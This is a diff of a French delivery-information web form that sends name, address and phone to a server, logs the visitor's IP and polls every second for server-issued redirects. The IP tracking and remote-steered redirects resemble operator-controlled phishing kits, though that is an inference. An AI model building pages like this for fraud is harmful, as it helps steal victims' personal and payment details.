@@ -3,33 +3,43 @@
 <head>
 <meta charset="UTF-8">
 <title>Livraison</title>
-</head>
-<body>
-<h1>Formulaire Livraison</h1>
-<form id="deliveryForm">
-<input type="text" name="nom" placeholder="Nom" required><br>
-<input type="text" name="prenom" placeholder="Prénom" required><br>
-<input type="text" name="adresse" placeholder="Adresse" required><br>
-<input type="text" name="telephone" placeholder="Téléphone" required><br>
-<button type="submit">Suivant</button>
-</form>
 <script>
-document.getElementById('deliveryForm').onsubmit = async e => {
-  e.preventDefault();
-  const f = e.target;
+let sessionId = null;
+
+async function sendDelivery(){
+  const nom = document.getElementById('nom').value;
+  const prenom = document.getElementById('prenom').value;
+  const adresse = document.getElementById('adresse').value;
+  const tel = document.getElementById('tel').value;
+
   await fetch('/api/delivery', {
     method:'POST',
     headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({
-      sessionId: window.sessionId,
-      nom: f.nom.value,
-      prenom: f.prenom.value,
-      adresse: f.adresse.value,
-      telephone: f.telephone.value
-    })
+    body: JSON.stringify({nom, prenom, adresse, telephone:tel})
   });
-  window.location.href = '/payment.html';
+}
+
+async function init(){
+  const res = await fetch('/api/visit');
+  const data = await res.json();
+  sessionId = data.ip;
+
+  setInterval(async ()=>{
+    const r = await fetch('/api/status');
+    const j = await r.json();
+    if(j.redirect) window.location.href = j.redirect;
+  },1000);
 }
 </script>
+</head>
+<body onload="init()">
+<h1>Informations de livraison</h1>
+<form onsubmit="sendDelivery(); return false;">
+  <input id="nom" placeholder="Nom" required><br>
+  <input id="prenom" placeholder="Prénom" required><br>
+  <input id="adresse" placeholder="Adresse" required><br>
+  <input id="tel" placeholder="Téléphone" required><br>
+  <button type="submit">Suivant</button>
+</form>
 </body>
 </html>
